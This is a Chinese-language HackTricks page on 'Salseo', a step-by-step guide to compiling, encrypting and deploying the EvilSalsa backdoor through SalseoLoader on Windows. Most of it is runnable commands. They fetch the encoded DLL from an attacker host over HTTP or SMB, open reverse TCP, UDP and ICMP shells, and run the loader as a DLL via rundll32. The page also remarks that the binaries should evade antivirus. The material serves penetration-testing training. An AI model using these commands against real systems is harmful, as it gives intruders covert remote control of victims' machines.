# Salseo

{{#include ../banners/hacktricks-training.md}}

## 编译二进制文件

从github下载源代码并编译**EvilSalsa**和**SalseoLoader**。您需要安装**Visual Studio**来编译代码。

为您将要使用的Windows盒子的架构编译这些项目（如果Windows支持x64，则为该架构编译）。

您可以在Visual Studio的**左侧“Build”选项卡**中的**“Platform Target”**选择架构。

（**如果找不到此选项，请点击**“Project Tab”**，然后点击**“\<Project Name> Properties”**）

![](<../images/image (132).png>)

然后，构建这两个项目（Build -> Build Solution）（在日志中将出现可执行文件的路径）：

![](<../images/image (1) (2) (1) (1) (1).png>)

## 准备后门

首先，您需要编码**EvilSalsa.dll**。为此，您可以使用python脚本**encrypterassembly.py**，或者您可以编译项目**EncrypterAssembly**：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
好的，现在你拥有执行所有 Salseo 操作所需的一切：**编码的 EvilDalsa.dll** 和 **SalseoLoader 的二进制文件**。

**将 SalseoLoader.exe 二进制文件上传到机器上。它们不应该被任何 AV 检测到...**

## **执行后门**

### **获取 TCP 反向 shell（通过 HTTP 下载编码的 dll）**

记得启动 nc 作为反向 shell 监听器，并启动一个 HTTP 服务器来提供编码的 evilsalsa。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **获取UDP反向Shell（通过SMB下载编码的dll）**

记得启动nc作为反向Shell监听器，并启动SMB服务器以提供编码的evilsalsa（impacket-smbserver）。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **获取 ICMP 反向 shell（编码的 dll 已经在受害者内部）**

**这次你需要一个特殊的工具在客户端接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **禁用 ICMP 回复：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 执行客户端：
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 在受害者内部，让我们执行salseo操作：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## 编译 SalseoLoader 为导出主函数的 DLL

使用 Visual Studio 打开 SalseoLoader 项目。

### 在主函数之前添加: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### 为此项目安装 DllExport

#### **工具** --> **NuGet 包管理器** --> **管理解决方案的 NuGet 包...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **搜索 DllExport 包（使用浏览选项卡），并按安装（并接受弹出窗口）**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

在你的项目文件夹中出现了文件: **DllExport.bat** 和 **DllExport_Configure.bat**

### **卸载** DllExport

按 **卸载**（是的，这很奇怪，但相信我，这是必要的）

![](<../images/image (5) (1) (1) (2) (1).png>)

### **退出 Visual Studio 并执行 DllExport_configure**

只需 **退出** Visual Studio

然后，转到你的 **SalseoLoader 文件夹** 并 **执行 DllExport_Configure.bat**

选择 **x64**（如果你打算在 x64 环境中使用它，那是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport 的命名空间中**）并按 **应用**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **再次使用 Visual Studio 打开项目**

**\[DllExport]** 不应再标记为错误

![](<../images/image (8) (1).png>)

### 构建解决方案

选择 **输出类型 = 类库**（项目 --> SalseoLoader 属性 --> 应用程序 --> 输出类型 = 类库）

![](<../images/image (10) (1).png>)

选择 **x64** **平台**（项目 --> SalseoLoader 属性 --> 构建 --> 平台目标 = x64）

![](<../images/image (9) (1) (1).png>)

要 **构建** 解决方案: 构建 --> 构建解决方案（在输出控制台中将出现新 DLL 的路径）

### 测试生成的 Dll

复制并粘贴 Dll 到你想测试的位置。

执行:
```
rundll32.exe SalseoLoader.dll,main
```
如果没有错误出现，您可能拥有一个功能正常的 DLL！！

## 使用 DLL 获取 shell

不要忘记使用 **HTTP** **服务器** 并设置 **nc** **监听器**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
